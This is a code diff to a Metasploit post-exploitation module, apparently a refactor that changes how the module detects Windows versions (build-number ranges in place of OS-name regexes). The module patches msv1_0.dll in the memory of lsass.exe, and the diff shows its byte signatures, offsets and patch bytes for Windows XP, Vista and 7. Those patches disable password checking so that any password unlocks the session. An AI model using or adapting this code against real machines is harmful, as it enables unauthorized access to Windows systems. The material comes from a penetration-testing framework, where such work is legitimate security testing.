@@ -6,6 +6,7 @@
 require 'metasm'
 
 class MetasploitModule < Msf::Post
+  include Msf::Post::Windows::Version
 
   def initialize(info = {})
     super(
@@ -22,14 +23,13 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => [
           'L4teral <l4teral[4t]gmail com>', # Meterpreter script
-          'Metlstorm'                        # Based on the winlockpwn tool released by Metlstorm: http://www.storm.net.nz/projects/16
+          'Metlstorm' # Based on the winlockpwn tool released by Metlstorm: http://www.storm.net.nz/projects/16
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
-              stdapi_sys_config_sysinfo
               stdapi_sys_process_attach
               stdapi_sys_process_memory_read
               stdapi_sys_process_memory_write
@@ -53,23 +53,23 @@ class MetasploitModule < Msf::Post
     revert = datastore['REVERT']
 
     targets = [
-      { sig: '8bff558bec83ec50a1', sigoffset: 0x9927, orig_code: '32c0', patch: 'b001', patchoffset: 0x99cc, os: /Windows XP.*Service Pack 2/ },
-      { sig: '8bff558bec83ec50a1', sigoffset: 0x981b, orig_code: '32c0', patch: 'b001', patchoffset: 0x98c0, os: /Windows XP.*Service Pack 3/ },
-      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xb76a, orig_code: '32c0', patch: 'b001', patchoffset: 0xb827, os: /Windows Vista/ },
-      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xb391, orig_code: '32c0', patch: 'b001', patchoffset: 0xb44e, os: /Windows Vista/ },
-      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xacf6, orig_code: '32c0', patch: 'b001', patchoffset: 0xadb3, os: /Windows Vista/ },
-      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xe881, orig_code: '32c0', patch: 'b001', patchoffset: 0xe93e, os: /Windows 7/ },
-      { sig: '8bff558bec83ec50a1', sigoffset: 0x97d3, orig_code: '32c0', patch: 'b001', patchoffset: 0x9878, os: /Windows XP.*Service Pack 3 - spanish/ }
+      { sig: '8bff558bec83ec50a1', sigoffset: 0x9927, orig_code: '32c0', patch: 'b001', patchoffset: 0x99cc, os_start: Msf::WindowsVersion::XP_SP2, os_end: Msf::WindowsVersion::XP_SP2 },
+      { sig: '8bff558bec83ec50a1', sigoffset: 0x981b, orig_code: '32c0', patch: 'b001', patchoffset: 0x98c0, os_start: Msf::WindowsVersion::XP_SP3, os_end: Msf::WindowsVersion::XP_SP3 },
+      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xb76a, orig_code: '32c0', patch: 'b001', patchoffset: 0xb827, os_start: Msf::WindowsVersion::Vista_SP0, os_end: Msf::WindowsVersion::Vista_SP2 },
+      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xb391, orig_code: '32c0', patch: 'b001', patchoffset: 0xb44e, os_start: Msf::WindowsVersion::Vista_SP0, os_end: Msf::WindowsVersion::Vista_SP2 },
+      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xacf6, orig_code: '32c0', patch: 'b001', patchoffset: 0xadb3, os_start: Msf::WindowsVersion::Vista_SP0, os_end: Msf::WindowsVersion::Vista_SP2 },
+      { sig: '8bff558bec81ec88000000a1', sigoffset: 0xe881, orig_code: '32c0', patch: 'b001', patchoffset: 0xe93e, os_start: Msf::WindowsVersion::Win7_SP0, os_end: Msf::WindowsVersion::Win7_SP1 },
+      { sig: '8bff558bec83ec50a1', sigoffset: 0x97d3, orig_code: '32c0', patch: 'b001', patchoffset: 0x9878, os_start: Msf::WindowsVersion::XP_SP3, os_end: Msf::WindowsVersion::XP_SP3 } # Spanish
     ]
 
     unsupported if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)
-    os = client.sys.config.sysinfo['OS']
+    version = get_version_info
 
     targets.each do |t|
-      next unless os =~ t[:os]
+      next unless version.build_number.between?(t[:os_start], t[:os_end]) && !version.windows_server?
 
       target = t
-      print_status("OS '#{os}' found in known targets")
+      print_status("OS '#{version.product_name}' found in known targets")
       pid = client.sys.process['lsass.exe']
       p = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
       dllbase = p.image['msv1_0.dll']
